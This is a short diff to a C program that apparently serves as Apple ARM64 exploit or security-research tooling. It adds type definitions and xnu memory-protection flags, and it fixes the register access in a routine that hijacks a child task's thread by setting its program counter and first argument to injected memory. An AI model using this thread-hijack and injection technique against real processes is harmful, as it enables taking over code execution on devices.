@@ -89,6 +89,25 @@ typedef struct {
 
 #define DSC_BASE 0x180000000ULL
 
+typedef unsigned long long u64;
+typedef unsigned int u32;
+typedef unsigned short u16;
+typedef unsigned char u8;
+
+/* VM_PROT extra bits (xnu <mach/vm_prot.h>): SLIDE=0x20, NOAUTH=0x40, SLIDE_EXTRA=0x80 */
+#ifndef VM_PROT_SLIDE
+#define VM_PROT_SLIDE       0x20
+#define VM_PROT_NOAUTH      0x40
+#define VM_PROT_SLIDE_EXTRA 0x80
+#endif
+
+static void *bmemset(void *d, int c, size_t n)
+{
+    unsigned char *p = (unsigned char *)d;
+    while (n--) *p++ = (unsigned char)c;
+    return d;
+}
+
 /* ---------------- report buffer ---------------- */
 static char g_out[16384];
 static size_t g_len;
@@ -375,11 +394,11 @@ static void run_trigger(int allinject)
     kr = thread_get_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&st, &sc);
     if (kr != KERN_SUCCESS) { say("P5 thread_get_state kr=0x%x\n", kr); kill(pid, SIGKILL); return; }
     st.__pc = base + TRIGGER_OFFSET;
-    st.__x0 = inj_va;                       /* child_trigger(cfg) */
+    st.__x[0] = inj_va;                     /* child_trigger(cfg) */
     st.__sp &= ~0xFULL;
     kr = thread_set_state(threads[0], ARM_THREAD_STATE64, (thread_state_t)&st, sc);
     say("P5 hijack pc=0x%llx x0=0x%llx kr=0x%x\n",
-        (unsigned long long)st.__pc, (unsigned long long)st.__x0, kr);
+        (unsigned long long)st.__pc, (unsigned long long)st.__x[0], kr);
     if (kr != KERN_SUCCESS) { kill(pid, SIGKILL); return; }
 
     kr = task_resume(ctask);
